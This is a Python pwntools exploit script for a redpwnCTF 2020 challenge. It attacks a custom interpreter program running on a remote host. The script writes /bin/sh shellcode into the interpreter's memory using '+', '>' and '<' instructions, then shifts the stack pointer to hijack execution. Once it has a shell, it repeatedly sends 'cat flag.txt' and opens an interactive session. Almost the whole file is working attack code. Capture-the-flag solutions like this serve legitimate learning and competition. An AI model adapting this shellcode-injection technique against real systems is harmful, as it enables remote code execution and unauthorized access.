#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 2020.redpwnc.tf --port 31755
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '2020.redpwnc.tf'
port = int(args.PORT or 31755)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(["python3", "dec_deobf.py", "breakout.aallo"])#process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def send_char(c):
    io.send(c)
    #return io.readuntil("ok")

def send_payload(payload: bytes):
    with log.progress("Sending payload") as p:
        for idx, c in enumerate(payload):
            for i in range(c):
                send_char("+")
            send_char(">")
            p.status(f"Sent byte {idx}/{len(payload)}")



# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

def load_file(filename) -> bytes:
    log.info("Loading compiled code from %s", filename)
    with open(filename, "rb") as f:
        return f.read()

compiled = load_file("breakout.aallo")

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

#shell = "mov rsp, rdi"
shell = shellcraft.sh()
log.info("Shellcode: %s", shell)
ass = asm(shell)
initial_sp = len(compiled) + 16
log.info("sp is initially at 0x%x", initial_sp)
url = "https://aaronesau.com/files/objectively-wrong.png"
start_sp = initial_sp + len(url)
log.info("sp is now at 0x%x", start_sp)

header = b"\x25\0" # % instruction
full_payload = header + ass

io = start()
send_payload(full_payload)
current_sp = start_sp + len(full_payload)
target_sp = 0x057a
diff = current_sp - target_sp
log.info("sp is now at: 0x%x, target: 0x%x, diff: 0x%x", current_sp, target_sp, diff)
for i in range(diff):
    io.send("<")
b1 = start_sp & 0xff
b2 = (start_sp & 0xff00) >> 8
current = 0x48a
c1 = current & 0xff
c2 = current >> 8
for i in range(c1, b1):
    io.send("+")
io.send(">")
for i in range(c2, b2):
    io.send("+")
#io.send("?")
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
io.send("?")
while True:
    io.sendline("cat flag.txt")
    if io.can_recv():
        log.info("can recv")
        data = io.recvline()
        if b"flag{" in data:
            log.success("flag: %s", data)
            break

io.interactive()

